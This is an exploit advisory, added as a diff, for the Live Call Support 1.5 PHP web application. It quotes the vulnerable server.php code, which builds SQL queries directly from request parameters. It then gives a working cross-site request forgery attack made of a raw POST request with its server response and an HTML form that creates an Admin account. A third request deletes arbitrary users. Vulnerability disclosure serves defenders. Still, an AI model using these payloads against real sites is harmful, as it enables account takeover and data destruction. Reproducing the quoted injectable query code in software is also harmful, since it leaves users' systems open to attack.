@@ -1,0 +1,170 @@
+# Exploit Title: Live Call Support 1.5 - Cross-Site Request Forgery (Add Admin)
+# Dork: N/A
+# Date: 2019-01-13
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://ranksol.com/
+# Software Link: https://codecanyon.net/item/live-call-support-widget-software-online-calling-web-application/22532799
+# Version: 1.5
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/server.php
+# 
+
+#/[PATH]/server.php
+#213 		case "save_user":{
+#214 
+#215 			if($_REQUEST['password']==$_REQUEST['confirm_password']){
+#216 
+#217 				if($_REQUEST['uid']==''){
+#218 
+#219 					$sql = "insert into users
+#220 
+#221 								(
+#222 
+#223 									name,
+#224 
+#225 									phone_number,
+#226 
+#227 									email,
+#228 
+#229 									password,
+#230 
+#231 									type
+#232 
+#233 								)
+#234 
+#235 							values
+#236 
+#237 								(
+#238 
+#239 									'".$_REQUEST['agent_name']."',
+#240 
+#241 									'".$_REQUEST['agent_number']."',
+#242 
+#243 									'".$_REQUEST['email_address']."',
+#244 
+#245 									'".$_REQUEST['password']."',
+#246 
+#247 									'".$_REQUEST['role']."'
+#248 
+#249 								)";
+#250 
+#251 				}else{
+#252 
+#253 					$sql = "update users set
+
+POST /[PATH]/server.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------16460805410548
+Content-Length: 879
+Cookie: PHPSESSID=5fd1dbc1e4c6b5876e1f44dbc157af9f
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+-----------------------------16460805410548: undefined
+Content-Disposition: form-data; name="agent_name"
+efeefe
+-----------------------------16460805410548
+Content-Disposition: form-data; name="agent_number"
+1234
+-----------------------------16460805410548
+Content-Disposition: form-data; name="email_address"
+efe@omerefe.com
+-----------------------------16460805410548
+Content-Disposition: form-data; name="role"
+1
+-----------------------------16460805410548
+Content-Disposition: form-data; name="password"
+efeefe
+-----------------------------16460805410548
+Content-Disposition: form-data; name="confirm_password"
+efeefe
+-----------------------------16460805410548
+Content-Disposition: form-data; name="uid"
+-----------------------------16460805410548
+Content-Disposition: form-data; name="cmd"
+save_user
+-----------------------------16460805410548--
+HTTP/1.1 302 Found
+Date: Sun, 13 Jan 2019 11:45:08 GMT
+Server: Apache
+X-Powered-By: PHP/7.1.25
+Access-Control-Allow-Origin: *
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+location: users.php
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/server.php
+# 
+
+<html>
+<body>
+
+<form method="post" action="http://localhost/[PATH]/server.php" enctype="multipart/form-data">
+	<div class="form-group">
+		<label>Name</label>
+		<input name="agent_name" value="" type="text">
+	</div>
+	<div class="form-group">
+		<label>Phone Number</label>
+		<input name="agent_number" value="" type="text">
+	</div>
+	<div class="form-group">
+		<label>Email Address</label>
+		<input name="email_address" value="" type="text">
+	</div>
+	<div class="form-group">
+		<label>Role</label>
+		<select name="role" class="form-control">
+			<option value="2">Consultant</option>
+			<option value="1">Admin</option>
+		</select>
+	</div>
+	<div class="form-group">
+		<label>Password</label>
+		<input name="password" value="" type="text">
+	</div>
+	<div class="form-group">
+		<label>Confirm Password</label>
+		<input name="confirm_password" type="text">
+	</div>
+	<div class="form-group">
+		<input name="uid" value="" type="hidden">
+		<input name="cmd" value="save_user" type="hidden">
+		<input value="Save" class="btn btn-primary" type="submit">
+		<input value="Back" class="btn btn-default" onclick="history.go(-1)" type="button">
+	</div>
+</form>
+
+</body>
+</html>
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/server.php?cmd=delete_user&userID=[DELETE_ID]
+# 
+
+#/[PATH]/server.php
+#191 		case "delete_user":{
+#192 
+#193 			$userID = $_REQUEST['userID'];
+#194 
+#195 			$res = mysqli_query($link,"delete from users where id='".$userID."'");
+#196 
+#197 			if($res){
